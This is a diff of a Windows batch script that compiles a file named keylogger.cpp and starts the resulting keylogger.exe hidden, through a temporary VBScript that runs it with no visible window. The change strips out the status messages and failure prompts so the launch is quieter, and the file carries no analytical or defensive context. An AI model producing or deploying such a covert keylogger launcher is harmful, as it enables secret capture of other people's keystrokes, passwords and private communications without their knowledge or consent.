@@ -1,25 +1,22 @@
 @echo off
+REM 
 
 REM
 set CppFile=keylogger.cpp
-set PyFile=import.py
-set LogFile=keylogger.log
+set ExeFile=keylogger.exe
 
-REM
-echo Compiling %CppFile%...
-g++ %CppFile% -o keylogger.exe -w
+REM 
+g++ %CppFile% -o %ExeFile% -w
 if %errorlevel% neq 0 (
-    echo Compilation failed. Exiting.
-    pause
     exit /b
 )
 
-REM
-echo Starting keylogger in hidden mode...
+REM 
 echo Set WshShell = CreateObject("WScript.Shell") > hide.vbs
-echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False >> hide.vbs
-cscript //nologo hide.vbs keylogger.exe
-del hide.vbs
+echo WshShell.Run """%ExeFile%""", 0, False >> hide.vbs
+
+REM 
+cscript //nologo hide.vbs
 
 REM
-exit
+del hide.vbs
